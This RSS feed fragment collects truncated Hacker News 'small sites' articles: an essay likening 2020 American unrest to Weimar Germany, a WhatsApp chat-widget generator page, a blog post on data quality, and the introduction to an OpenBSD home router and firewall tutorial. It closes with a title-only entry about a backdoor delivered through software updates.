<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          

<article>
    <figure id="feature-image-figure">
    <img data-src="/content/images/2020/10/weimarization-1.jpg" alt="" src="https://www.americanpurpose.com/content/images/2020/10/weimarization-1.jpg">
  </figure>



    <section>
      <!--kg-card-begin: html--><p>
    <span>‚ÄúT</span>he Democratic Party,‚Äù wrote the late Walter Laqueur, was ‚Äúliberal and slightly left-of-centre in outlook, progressive but not too much so, in favour of reform but afraid of going too far. . . . They had quite a few professors among their leading supporters and also some bankers and industrialists, but for the majority of academics . . . [it] was quite unacceptable.‚Äù Bourgeois parties ‚Äúare never militant, almost by definition‚Äù‚Äîand the ‚ÄúDemocratic Party was perhaps the least militant of all.‚Äù</p><!--kg-card-end: html--><p>Central to its impotence, Laqueur believed, was ‚Äúthe mood of an activist younger generation.‚Äù An ‚Äúunthinking, aimless radicalism,‚Äù which ‚Äúpreferred drums to speeches and parades to long and inconclusive discussions,‚Äù could ‚Äúturn left or right or lead nowhere at all.‚Äù Not just on college campuses: ‚ÄúContempt for ‚Äòthe system,‚Äô‚Äù its ‚Äúvested interests, cliques, and party caucuses,‚Äù permeated the middle class. Leftists ‚Äúattacked the Republic and all it stood for as something that was rotten through and through,‚Äù while conservatives thought ‚Äú‚Äòthe system‚Äô so corrupt that any political order that succeeded it would be an improvement‚Äù‚Äîeven as they complained (correctly) that ‚Äúthe left was anti-patriotic.‚Äù Both sides ‚Äúwere unhappy, though for different reasons, with . . . the existing state of affairs.‚Äù ‚ÄúThere was not the slightest willingness to take each other‚Äôs point of view seriously, let alone to compromise.‚Äù </p><p>That, at any rate, is how Laqueur saw Weimar Germany with the benefit of hindsight.</p><!--kg-card-begin: html--><p>
    <span>A</span>merica is not Weimar. We have not lost a World War or been forced to pay war debt; we‚Äôve had 250 years of democracy, not 25; Trump isn‚Äôt Hitler, and Biden, whatever his faults, isn‚Äôt calling for communism. There is street violence, but a lot less of it‚Äîfor unlike Weimar, we do not generally let paramilitary groups supplant the police, Seattle‚Äôs ‚Äúautonomous zone‚Äù being the exception that proves the rule.
</p><!--kg-card-end: html--><p>But the exceptions are mounting. In Portland, protestors <a href="https://www.newsweek.com/protesters-attempt-create-autonomous-zone-portland-graffiti-smoke-pigs-precinct-1513743">attempted to create</a> an autonomous zone of their own by barricading the area with stolen property and blocking the exits of a nearby police precinct; ‚Äúgoing to burn the building down,‚Äù one man threatened. In Minneapolis, a precinct actually did burn down after it was <a href="https://www.nbcnews.com/news/us-news/protests-looting-erupt-again-minneapolis-area-following-death-george-floyd-n1216881">set ablaze</a> by ‚Äúdemonstrators,‚Äù two of whom (<a href="https://www.startribune.com/charges-minneapolis-brothers-destroyed-property-inside-third-precinct/571450752/">both white</a>) were subsequently charged. In Kenosha, riots claimed two lives and several more city blocks, which <a href="https://twitter.com/joshglancy/status/1299734436792197120">were</a> ‚Äúindistinguishable from a war zone‚Äù by the time the dust settled. </p><p>And throughout the country, from <a href="https://www.nytimes.com/2020/06/23/nyregion/nyc-shootings-surge.html">New York City</a> to <a href="https://www.chicagotribune.com/news/criminal-justice/ct-chicago-police-six-month-crime-stats-20200626-wqsf3rebavaldex7v54ozqsnxe-story.html">Chicago</a> to <a href="https://www.washingtonpost.com/local/public-safety/davon-mcneal-shot/2020/07/05/16390c1a-bec6-11ea-b178-bb7b05b94af1_story.html">Washington, DC</a>, shootings have surged alongside looting‚Äîin some places, <a href="https://www.newsday.com/long-island/nypd-shootings-increase-1.46044819">by over 400 percent</a>‚Äîdestroying lives and livelihoods in their wake.</p><p>On its own, this would hardly warrant comparison with Weimar. Crime and violence are as American as apple pie, and street fighting, though aesthetically German, has plenty of precedent in the U.S. What recalls interwar Germany is not the chaos itself, but the way it has been excused, even encouraged, by those notionally in a position to stop it‚Äîmany of whom seem ambivalent about whether the republic it threatens deserves defense. Examples of this excuse-making include, but are not limited to:</p><ol><li>The true <a href="https://unherd.com/2020/07/the-ugly-truth-about-the-blm-protests/">but trivial claim</a> that the protests have been ‚Äúmostly‚Äù peaceful.</li><li>The argument, made by a <a href="https://www.politico.com/news/magazine/2020/06/03/of-course-destruction-of-property-is-violence-299759">Pulitzer-winning <em>New York Times</em> journalist</a>, that ‚Äúdestroying property, which can be replaced, is not violence.‚Äù</li><li>A <a href="https://thenewinquiry.com/in-defense-of-looting/">widely-circulated essay</a>, written during the Ferguson protests of 2014, that defends looting as a ‚Äúrighteous,‚Äù attention-grabbing tactic in the fight against white supremacy. (The author subsequently elaborated her arguments in a <a href="https://www.npr.org/sections/codeswitch/2020/08/27/906642178/one-authors-argument-in-defense-of-looting">controversial interview</a> with NPR.)</li></ol><p>It is telling that, despite reaching the same conclusion, these excuses all contradict one another. If violence were extraordinarily rare (1), there would be no reason to deny its status <em>as</em> violence (2), or to defend its tactical value (3)‚Äîwhereas if looting <em>weren‚Äôt</em> violent, if it didn‚Äôt disrupt or endanger life, its attention-grabbing power would be extraordinarily diminished. The contradictions suggest that elite alegality isn‚Äôt rooted in any specific principle, but rather a kind of inchoate radicalism: a vague, burn-it-down impulse increasingly common across the political spectrum, whose ends are drifting farther and farther apart. If the 2016 election <a href="https://www.vox.com/2016/7/18/12210500/diagnosed-dysfunction-republican-party">seemed to confirm</a> the existence of ‚Äúasymmetric‚Äù polarization, the 2020 tumult suggests that polarization can only remain asymmetric for so long. </p><p>And as the symmetries grow more apparent, the shadow of Weimar grows longer still. Much has been made‚Äî<a href="https://www.the-american-interest.com/2018/11/12/resilient-democracies/">too much</a>‚Äîof what are ultimately very weak parallels between Donald Trump and Adolf Hitler. But though<strong> </strong>Trump‚Äôs America looks nothing like Nazi Germany, it <em>has </em>developed echoes of the Republic from which Nazism arose‚Äîechoes that implicate the left no less than the right. Weimar was not, as is sometimes suggested, a good society beset by bigots and bad luck. It was a febrile, dysfunctional culture in which few voters, and even fewer elites, believed in the Republic they eventually dissolved. We often hear about the perils of ‚Äú<a href="https://www.thenation.com/article/archive/trump-impeachment-journalism/">bothsidesism</a>,‚Äù of treating ‚Äúfascists‚Äù and ‚Äúanti-fascists‚Äù as equivalent threats. Yet in the collapse of Weimar Germany, both sides played an important role.</p><!--kg-card-begin: html--><p>
    <span>T</span>o be fair, Weimar didn‚Äôt have a whole lot to work with. One of the things it did not have‚Äîor rather had stolen‚Äîwas a well-defined founding. Officially, it began outside the German Reichstag on November 9, 1918, where the Social Democratic minister Philipp Scheidemann proclaimed the birth of the Republic. But unofficially, it began at Hohenzollern Palace two hours later, when the communist leader Karl Liebknecht proclaimed a Republic of his own‚Äîthe first of many such putsches by Germany‚Äôs leftmost wing. The repeated attempts to overthrow the government, and the fact that the Social Democrats, like the communists, claimed to be committed Marxists, made it easy for the right to blame instability on the left, and for the masses to associate that instability with Weimar's socialist architects.
</p><!--kg-card-end: html--><p>But many republics, including ours, had violent foundings. What made Weimar special, as the <a href="https://www.amazon.com/Weimar-Republic-Crisis-Classical-Modernity/dp/0809015560">historian Detlev Peukert put it</a>, was that it ‚Äúwas not marked by an event that served as an old-fashioned but politically unifying . . . moment in national history, along the lines of the American Declaration of Independence.‚Äù It had two competing proclamations, two rival origin stories, which meant that there was ‚Äúno legitimizing founding ritual‚Äù to sustain ‚Äúactive commitment to the new order.‚Äù Germans did, of course, debate which story was the true one. That it was debated at all both signaled and intensified a profound lack of legitimacy, an open wound ripe for infection. </p><p>These disagreements‚Äîless about facts than about symbolism‚Äîdid not mean collapse was inevitable. (Weimar survived the 1920s, after all.) But they did mean that there were few common reference points to rein in polarization, and more chances for insurgent ideologies‚Äînever mind actual insurgents‚Äîto gain steam. </p><p>Weimar had no shortage of radicals; centrists, on the other hand, were a dying breed. The intelligentsia fell roughly into one of two camps: leftists who hated everything about Germany, from its culture to its constitution; and rightists who hated the constitution because it was insufficiently German‚Äîwhich is to say, insufficiently authoritarian. The last group dominated the universities, whose reliance on public funds did not dampen their rancor toward the Republic. In fairness, those funds hadn‚Äôt stopped the academic job market from cratering after WWI, which meant that even the best-credentialed thinkers were often precariously employed. With few prospects in the existing system, the intellectual class saw little reason to defend it, and had an easy time rationalizing its destruction. The upshot was that college-educated civil servants typically hated the Republic they were serving, as did judges, policymakers, and educators. Ditto artists, journalists, and playwrights, though these professions skewed left. </p><p>Beyond their shared anti-Republicanism, all that the two sides had in common was their contempt for one another. The left derided the right as backwards-looking and chauvinistic, while the right derided the left as self-hating and unpatriotic‚Äîall of which, it must be said, was true. Kurt Tucholsky, Weimar‚Äôs leading leftwing satirist, complained that ‚Äúthe German spirit was poisoned almost beyond recovery,‚Äù and that ‚ÄúGerman democracy [was] a facade and a lie.‚Äù ‚ÄúThere is no secret of the Germany army I would not hand over readily to a foreign power,‚Äù he bragged in 1931, a boast that did not exactly endear him to the people who took power in ‚Äò33. Those people, of course, were just as Tucholsky described them: irredeemable, backwards bigots whose deaths could not come soon enough.</p><p>But the Nazis never won more than a plurality of the vote‚Äîand most conservative elites were not Nazis. (Indeed, several became their victims.) What united the right was not a particular political program, but a general sense of grievance against the far left and republican center, distinct groups it would often synonymize. Marxism, modernism, liberalism‚Äîthese were all shades of the same thing, corruptions of the old order. An equal but opposite elision occured on the left, with the communists calling everyone to their right‚Äîincluding the Social Democrats‚Äîfascists, an unfair charge that many leftwing intellectuals nonetheless echoed. The result of these stereo-stereotypes was threefold.</p><p>First, they exacerbated Weimar‚Äôs crisis of legitimacy. If the Republic lacked a founding ritual, the elites were in no hurry to invent one; rather, the ‚Äúcenter‚Äù was so widely anathematized that it effectively didn‚Äôt exist. In one case, <a href="https://www.warhistoryonline.com/instant-articles/communists-allied-with-nazis.html">the communists even endorsed a Nazi referendum</a> to overthrow the Social Democratic government in Prussia, on the theory that social democracy was a greater threat than National Socialism. Status ‚Ä¶</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.americanpurpose.com/articles/weimarization-american-republic/">https://www.americanpurpose.com/articles/weimarization-american-republic/</a></em></p>]]>
            </description>
            <link>https://www.americanpurpose.com/articles/weimarization-american-republic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928340</guid>
            <pubDate>Thu, 29 Oct 2020 08:23:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Add WhatsApp Chat Button to your website for free]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24928309">thread link</a>) | @marky_nolan
<br/>
October 29, 2020 | https://www.wati.io/whatsapp-chat-button/ | <a href="https://web.archive.org/web/*/https://www.wati.io/whatsapp-chat-button/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
          		<div data-elementor-type="wp-page" data-elementor-id="9963" data-elementor-settings="[]">
			<div>
				<div>
							<section data-id="8c37f33" data-element_type="section">
						<div>
				<div>
				<div data-id="49453f9" data-element_type="column">
			<div>
					<div>
				<div data-id="ee6f3ef" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2><span>Generate WhatsApp Live Chat Widget</span></h2>		</p>
				</div>
				
				<div data-id="d273749" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeIn&quot;}" data-widget_type="html.default">
				<div>
			
<div>
    <div>
        <div>
            <p>
                Chat Button Settings
            </p>
            <p>
                Customise chat button settings - Choose chat button design, Set color &amp; change CTA text.
            </p>
            <p><b>Button Style</b>: All possible &amp; attractive button designs.
            </p>
            <p><b>Background Color</b>: Choose any color to get personalize WhatsApp Chat button.
            </p>
        </div>
    </div>
    <div>
        <div>
            
            
            <div>
                <div>
                    <p>Position</p>
                    <p>Bottom-Left
                       Bottom-Right
                    </p>
                </div>
                
            </div>
        </div>
    </div>
</div>

<div>
    <div>
        <div>
            <p>Chat Widget settings</p>
            <p>Customize the chat widget heading, help text and change settings as you wish.</p>
        </div>
    </div>
    <div>
        <div>
            
            <div>
                <div>
                    <p>Phone Number with country code</p>
                    
                </div>
            </div>
            
            
            
            <div>
                <div>
                    <p>Open widget by default</p>
                    <p>True
                        False
                    </p>
                </div>
                <div>
                    <p>Chat Widget Preview</p>
                    <div id="whatsappChatWidgetPreview">
                        <div>
                            <div id="whatsappChatWidgetHeaderPreview"><p><img src="https://cdn.clare.ai/wati/images/WATI_logo_square_2.png" id="whatsappChatWidgetBrandImagePreview" alt="Brand Image"></p><div>
                                    <p>WATI</p>
                                    <p>Typically replies within a day</p>
                                </div>
                                <p><img src="https://cdn.shopify.com/s/files/1/0070/3666/5911/files/Vector.png?574"></p>
                            </div>
                            <div>
                                <div>
                                    <p>WATI</p>
                                    <p>Hi, there!
                                        <br>How can I help you?</p>
                                </div>
                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

		</div>
				</div>
				
				
				
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
		        </div>
    </div></div>]]>
            </description>
            <link>https://www.wati.io/whatsapp-chat-button/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928309</guid>
            <pubDate>Thu, 29 Oct 2020 08:19:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is data quality and how to improve it]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928298">thread link</a>) | @mmanja
<br/>
October 29, 2020 | https://www.keboola.com/blog/data-quality | <a href="https://web.archive.org/web/*/https://www.keboola.com/blog/data-quality">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Learn more about data quality, its importance for your business, and how to improve it. </p><div><p>We‚Äôve all heard the war stories born out of wrong data:</p><ol role="list"><li>Important packages are sent to the wrong customer.</li><li>Double payments are made to suppliers due to corrupted invoicing records.</li><li>Sales opportunities are missed because of incomplete product records.<br></li></ol><p>These stories don‚Äôt just make you and your company look like fools, they also cause great economic damages. And the more your enterprise relies on data, the greater the potential for harm.<br></p><p>Here, we take a look at what data quality is and how the entire data quality management process can be improved.</p><h2>What is data quality?&nbsp;</h2><p>Defining data quality is an elusive task. Even though we have an intuitive feeling that it relates to data of high standards, the exact definition is tough to pin down.&nbsp;Various institutions, academics, and industry experts have tried to specify the characteristics of data integrity in their definitions of data quality.&nbsp;<br>‚Äç</p><p>For example, Fleckenstein and Fellows (2018) refer to high-quality data as data that<br></p><blockquote><em>"are fit for their intended uses in operations, decision making and planning</em>"</blockquote><p>In a similar vein, the National Institute of Standards and Technology defines data quality as:</p><blockquote>"<em>the usefulness, accuracy, and correctness of data for its application</em>"&nbsp;</blockquote><p>So, unless we are a student trying to pass an exam in data management processes, why do we care about these definitions?<br></p><p>It‚Äôs clear from the definitions above that both are oriented towards the pragmatic aspects of data quality. <strong>Having high-quality data allows us to plan, make decisions, and use data in various applications.</strong><br></p><p>But why does <em>this </em>matter?<br></p><p>Data quality has huge ramifications on the business‚Äôs bottom line. Having a clear understanding (definition) of what constitutes data quality allows us to measure and fix it.<br></p><p>Let‚Äôs dive deeper into why data quality is so important.<br></p><h2>Why is data quality important?</h2><p>The war stories mentioned in the introduction speak volumes about the importance of data. But the quality of data is important for a multitude of other reasons:</p><ol role="list"><li><strong>Data quality affects the bottom line</strong>. Low-quality or corrupted data will affect your business operations from a financial standpoint. From increased expenses when making mistakes (returns of goods sold, double invoicing, etc.) to loss of financial opportunities (negotiating lower supply costs, missing out on sales due to incomplete data or lack of customer trust, etc.), low-quality data costs more than it first might seem.</li><li><strong>Data quality affects trust in data</strong>. When issues with data quality are discovered, you lose trust. Customers may not trust you because you‚Äôve made mistakes, while business leaders might not find the data reliable for decision-making. Whatever the case, low data quality has long-term damaging effects on the reputation of data and the people who take care of it.</li><li><strong>High-quality data is necessary for data products</strong>. We‚Äôre running businesses in an age when more and more products depend on data. Whether it‚Äôs applications that use customer data to provide services (financial investment apps, sports apps, etc.) to machine learning products that base their entire performance on data, having high-quality data for your product is the same as having high-quality fuel for your rocket ship. Unless the fuel is of a superior standard, the rocket is not going to fly. Or as machine learning engineers say: ‚ÄúGarbage in, garbage out.‚Äù Bad data is just not going to cut it. Ensuring that data is as good as it possibly can be is a prerequisite for a high-performing product line.<br></li></ol><h2>What are the common data quality issues?	</h2><p>There are as many issues with data quality as there are data experts with war stories.&nbsp;<br></p><p>Ask any data engineer or architect and they will gladly share how a database design or analytics implementation led to a massive business debacle.&nbsp;<br>To understand the recurrent issues surrounding data quality, we have to group these issues around common themes, which are known as the dimensions of data quality.<br></p><p>There are multiple dimensions of data quality which matter:&nbsp;</p><ol role="list"><li><strong>Data accessibility or availability</strong>. Access to data is necessary if we want to analyze it and draw conclusions that lead to profitable business insights. Issues regarding data accessibility can happen at any stage along the <a href="https://www.keboola.com/blog/etl-process-overview" target="_blank">ETL pipeline</a>. Our data collection could be broken, skipping the import of some datasets into our database, or we could encounter a problem with sharing permissions, which prevents analysts from accessing the data required for their analysis. This also hinders the collaboration between different analysts because they lack access to the data that is needed to work together.</li><li><strong>Data accuracy or correctness</strong>. Accuracy refers to how well the data reflects the real world that it‚Äôs trying to describe. This characteristic of data quality is hard to specify in data-quality standards because accuracy issues take on many forms, from changing addresses that are not updated within customer records to misspellings and wrongful insertions. Data accuracy is usually asserted by applying business rules within the <a href="https://www.keboola.com/blog/etl-process-overview" target="_blank">data cleansing</a> process, which checks the data for correctness.&nbsp;</li><li><strong>Data completeness or comprehensiveness</strong>. Missing data values always present an issue within data operations. Ensuring that the records are complete is one of the characteristics of high-quality data. During the <a href="https://www.keboola.com/blog/the-ultimate-guide-to-data-cleaning" target="_blank">data cleaning</a> process, the data assets with missing values are either removed or they are imputed with the best estimates as replacements.</li><li><strong>Data consistency, coherence, or clarity</strong>. When two records about the same unit hold conflicting information, they are not just inconsistent - they also dampen your ability to make data-driven decisions. And let‚Äôs not even think about the regulatory compliance issues you can get into if your financial reports show inconsistent data...</li><li><strong>Data relevance, pertinence, or usefulness</strong>. You might have collected all of the data in the world, but it‚Äôs completely useless if it‚Äôs not relevant to your analysis and your business. Collecting relevant or useful data (and discarding the rest) is part of data quality assurance.</li><li><strong>Data timeliness or latency</strong>. How quickly is the data available to us? If there is a delay between collecting data from its data sources and analyzing it, we could lose out on the potential of real-time analytics. If the delays are even longer, we might produce reports before all of the data is available, thus painting an incorrect picture between what is reported (with missing data) and what is actually true (with delayed data).&nbsp;</li><li><strong>Data uniqueness</strong>. Some data is unique by design, such as the UUID number of your product, or the identity of your customers. The common issue in data quality is record duplication, whereby the same information is inserted multiple times. This issue usually arises during data entry, especially if it‚Äôs done manually.</li><li><strong>Data validity or reasonableness</strong>. Valid data are those that are in line with the business or technical constraints. For example, your customer is probably not 140 years old, so it‚Äôs likely that there‚Äôs a validity issue here. But validity does not just refer to semantic constraints (such as age). It also includes the distribution of data and its aggregated metrics. Looking at the mean, median, mode, standard deviations, outliers, and other statistical characteristics allows you to discern the validity of your data.<br></li></ol><h2>Who is responsible for data quality?</h2><p>Data quality is everyone‚Äôs business because good data quality allows everyone to trust the process and do their best work. However, depending on the type of operations you run, different people might be responsible for asserting high-quality data.<br></p><p>In enterprises and cross-organizational deployments, there is usually a data management team in charge of asserting data quality. The team comprises a data manager, who oversees the entire data quality assurance operation, as well as practitioners who resolve technical conflicts and data stewards. The latter are responsible for communicating data quality issues and problem resolutions across the silos within the business.<br></p><p>In smaller organizations, startups, and home-businesses, the responsibility often falls on the shoulders of the ‚Äòdata person‚Äô (data scientist, business analyst, or data engineer) or someone from the IT department.&nbsp;<br></p><p>How do these teams and individuals achieve high-quality data? They go through the cycle of data quality management and improve it.<br></p><h2>How to improve data quality</h2><p>There is a process of best practices when improving the quality of your data:</p><ol role="list"><li><strong>Start by setting up a data governance framework</strong>. The data governance framework specifies which standards you will follow and what business requirements and rules need to be applied to achieve high-quality data. This also includes regulatory compliance, i.e. how your data quality practices fulfill the European Union's General Data Protection Regulation (GDPR) and/or California Consumer Privacy Act (CCPA) regulations.&nbsp;</li><li><strong>Set up KPIs or goals for data quality</strong>. Identify the data quality dimensions that need fixing and specify them as KPIs. A common way to assess how much ‚Äòdata accuracy‚Äô has been improved is to measure the number of data assets (tables, databases, ETL pipelines, etc.) that you have checked for accuracy issues. Make sure that you also set up a logging system for data quality reporting.</li><li><strong>Profile data and establish a list of issues</strong>. Data profiling refers to the analysis of data which produces a report on data distribution, frequencies, central tendencies, and deviations. This can then be used in understanding the structural level of data. Use this and other analyses to compile a list of issues which need fixing.</li><li><strong>Fix the issues</strong>. It‚Äôs as simple as that - fix them. This is usually done by data practitioners (hands-on data managers, data engineers, and data scientists) by cleaning the data (we have written a long guide on the <a href="https://www.keboola.com/blog/the-ultimate-guide-to-data-cleaning" target="_blank">best practices for cleaning data - check it out here</a>). Be sure to log every fix so that you can generate a report of ‚Ä¶</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.keboola.com/blog/data-quality">https://www.keboola.com/blog/data-quality</a></em></p>]]>
            </description>
            <link>https://www.keboola.com/blog/data-quality</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928298</guid>
            <pubDate>Thu, 29 Oct 2020 08:16:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to build an amazing router and firewall with OpenBSD: Part 1]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928202">thread link</a>) | @URfejk
<br/>
October 29, 2020 | https://unixsheikh.com/tutorials/how-to-build-an-amazing-router-and-firewall-with-openbsd-part-1-introduction.html | <a href="https://web.archive.org/web/*/https://unixsheikh.com/tutorials/how-to-build-an-amazing-router-and-firewall-with-openbsd-part-1-introduction.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>


<div><p>In this multi-part tutorial I'm going to show you how you can use cheap and "low end" hardware to build an amazing router with firewalling capabilities, DNS, DHCP and much much more, using the fantastic OpenBSD operating system. I am going to use a setup in which the router segments the local area network (LAN) into separate networks, one for the grown-ups in the house, one for the children, and one for public facing servers, such as a private web server or mail server. I'll also show you how you can use DNS to effectively block out most ads, porn, and many harmful websites on the Internet. Last, but not least, I'll show you how you can use the firewall and DNS to block outgoing telemetric data from computers running Microsoft Windows, NVIDIA graphics drivers, etc. The router can also be used on small to mid-size offices.</p><p>If you don't need a segmented network, but simply need a solid firewall and/or DNS server, you can still use the tutorial as I am going to guide you step by step introducing and setting up one solution at a time.</p></div>

<h3>Table of contents</h3>
<ul>
<li><a href="#why-a-firewall">Why a firewall?</a></li>
<li><a href="#the-hardware">The hardware</a></li>
<li><a href="#the-network">The network</a></li>
<li><a href="#why-openbsd">Why OpenBSD?</a></li>
</ul>

<h2 id="why-a-firewall">Why a firewall?</h2>
<p>Almost no matter how you connect to the Internet from your home or office you need a real firewall between you and the modem or router that your ISP has provided you with.</p>
<p>I have worked in the ISP business and one thing I have noticed is that not only do they rarely keep your modem or router firmware up to date, they almost always use some of the cheapest and worst products on the market.</p>
<p>One of the sources for most of the SPAM email on the Internet originates from consumer market modems and routers that has been compromised.</p>
<p>With a firewall between you and the Internet, meaning the modem or router from your ISP, you can not only protect your computers on the inside much better, but you can also monitor the traffic that comes and goes to and from your house, and you can react to situations that might call for an alarm.</p>
<p>Without a firewall between your local network and the ISP modem or router you could basically consider this an open door policy, like leaving the door to your house wide open, because you cannot trust the equipment from your ISP.</p>
<p>At one particular ISP I even witnessed how some employees used to hack into customers computers. Of course the ISP didn't know that at the time.</p>
<p>No matter what, it is always a really good idea to put a real firewall between your local network and the Internet, and with OpenBSD you get an extremely solid solution.</p>

<h2 id="the-hardware">The hardware</h2>
<p>You don't have to buy expensive hardware to get an effective router and firewall for your house or office. Even with cheap and "low end" hardware you can get a very solid solution.</p>
<p>I have build multiple setups using the <a href="https://www.asrock.com/mb/Intel/Q1900DC-ITX/">ASRock Q1900DC-ITX</a> motherboard that comes with an Intel Quad-Core Celeron processor.</p>
<p><img src="https://unixsheikh.com/includes/img/asrock-q1900dc-itx.png" alt="ASRock Q1900DC-ITX motherboard"></p>
<p>I'll admit, it's a pretty "crappy" motherboard, but it gets the job done and I have several builds that have run very solid for many years on gigabit networks with full saturation and the firewall, DNS, etc. working "overtime" and the CPU hardly breaks a sweat. This is contrary to the expensive Soekris, which people used to recommend, that typically ran less powerful Intel Atom processors.</p>
<p>The ASRock Q1900DC-ITX motherboard has the advantage that it comes with a DC-In Jack that is compatible with a 9~19V power adapter, making it very power saving. Unfortunatly the ASRock Q1900DC-ITX motherboard is no longer sold, but I'm just using it as an example because I have used several other cheap boards as well.</p>
<p>I have also used the ASRock Q1900-ITX (it doesn't come with the DC-In Jack) combined with a PicoPSU.</p>
<p><img src="https://unixsheikh.com/includes/img/picopsu.png" alt="PicoPSU power supply"></p>
<p>You can find different brands and versions of the PicoPSU, some are better quality than others. I have two different brands, the original and a cheaper knockoff, both performing very well and they save quite a bit of power contrary to running with a normal power supply that typically drains at least 10 watts more.</p>
<p>Lastly, I am using a cheap Intel knockoff quad port NIC found on Ebay like this one:</p>
<p><img src="https://unixsheikh.com/includes/img/intel-quad-nic.png" alt="Intel Quad NIC"></p>
<p>Now before you start condemning me for using low end hardware, I know it is better to use quality hardware, especially on a network that you care about, but this tutorial is about how you can get away with using fairly cheep hardware and still get an extremely useful product that will continue to serve you well for many years - at least that is my experience.</p>
<p>I recommend that you look for a low power mini ITX board with hardware <a href="https://www.openbsd.org/amd64.html">supported by OpenBSD</a> such as an Intel Celeron or Intel i3 processor. These boards are typically cheap, less power hungry, and they don't take up very much space. I don't recommend using the Intel Atom CPU if you have a gigabit network as they usually choke because they can't handle the amount of traffic, but your milage may vary. Also, I have never had any luck finding any useful AMD boards because the CPU usually would require much more power than the Intel counterpart - however my experience with AMD is not up to date any longer. I also don't recommend older dual core Intel CPU's, they will work perfectly, but they also require more power.</p>
<p>Oh, and then you need a couple of cheap gigabit switches too for the segmented LANs, at least if you have more than one computer you want to connect to the same LAN :)</p>

<h2 id="the-network">The network</h2>
<p>A router is basically a device that regulate network traffic between two or more separate networks. The router will ensure that network traffic intended for the local network doesn't run out into the wild on the Internet and traffic on the Internet, that is not intended for your local network, stays on the Internet.</p>
<p><b>Note</b>: Just for information, a router is sometimes also referred to as a gateway, which generally is alright, but in truth a real gateway joins dissimilar systems. An example of a gateway would be a device that joins a PC network with a  telecommunications network.</p>
<p>In this tutorial we're building a router and we have 4 different but similar networks to work with. One is the Internet and the other three are the internally segmented LANs. Some people prefer to work with virtual LANs, but in this tutorial I'm going to use the quad port NIC from above. You can achieve the same result by using multiple one port NICs if you prefer that, you just have to make sure that you have enough room and free PCI slots on the motherboard. You can also use the Ethernet port on the motherboard itself, but it depends on the driver and support for the device. I have had no problems using the typical Realtek PCI gigabit Ethernet controller that normally comes with many motherboards even though I recommend Intel over Realtek.</p>
<p>Of course you don't need to segment the network into several parts if you don't need that, and it will be very easy to change the things I setup in this tutorial, but I have decided to use this approach in order to show you how you can protect your children by segmenting their network into a separate LAN that not only gets ad and porn blocking using DNS blocking (all the segments gets that), but you can even whitelist the parts of the Internet you want them to have access to. The last part about whitelisting is difficult and generally not recommended unless your children only requires very limited access, but it is doable with some work, and I'm going to show you one way you can do that in part 3 of the tutorial.</p>
<p>This is an illustration of the network we're going to setup:</p>
<pre><code>
                       Internet
                          |
                    xxx.xxx.xxx.xxx
                    ISP Modem (WAN)
                      10.24.0.23
                          |
                       OpenBSD
                      10.24.0.50
                  (router/firewall)
                          |
     -------------------------------------------
     |                    |                    |
    NIC1                 NIC2                 NIC3
192.168.1.1          192.168.2.1          192.168.3.1
LAN1 switch          LAN2 switch          LAN3 switch
     |                    |                    |
     -- 192.168.1.2       -- 192.168.2.2       -- 192.168.3.2
     |  Grown-up PC       |  Child PC1         |  Public web server
                          |
                          -- 192.168.2.3
                          |  Child PC2
</code></pre>
<p>The IP addresses that begins with 10 are whatever IP addresses your ISP router gives you, in my case it looks similar to the above. The IP addresses beginning with 192 are IP addresses that we're going to use in our local network.</p>
<p>I have not dealt with any kind of wireless connectivity in this setup. Wireless chip firmware is notoriously buggy and exploitable and I recommend you don't use any kind of wireless connections if you can do without. If you do require wireless connections I strongly recommend that you disable wireless access completely from the ISP modem or router (if possible), and then buy the best wireless router you can find and put it behind the firewall in an isolated segment instead. That way should your wireless device ever be compromised you can better control the outcome and limit the damage. You can further setup the wireless router such that any devices connected to it have their own IPs that pass directly through the wireless router, but at the same time block traffic directly originating from the wireless router itself. That way you can prevent the wireless router from "phoning home". You can also get a wireless adapter supported by OpenBSD and have your OpenBSD router run as the actual access point, however I much prefer to segment the wireless part to either a separate wireless router or another OpenBSD machine serving as a wireless access point behind the firewall itself. Also, as of writing (as far as I know) none of the OpenBSD wireless drivers are fully without problems.</p>

<h2 id="why-openbsd">Why OpenBSD?</h2>
<p>In truth, you can get a similar setup to the above running almost any kind of Linux flavor, but OpenBSD is specifically very well suited and designed for ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://unixsheikh.com/tutorials/how-to-build-an-amazing-router-and-firewall-with-openbsd-part-1-introduction.html">https://unixsheikh.com/tutorials/how-to-build-an-amazing-router-and-firewall-with-openbsd-part-1-introduction.html</a></em></p>]]>
            </description>
            <link>https://unixsheikh.com/tutorials/how-to-build-an-amazing-router-and-firewall-with-openbsd-part-1-introduction.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24928202</guid>
            <pubDate>Thu, 29 Oct 2020 07:58:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FakeMBAM: Backdoor delivered through software updates]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24928188">thread link</a>) | @URfejk
<br/>
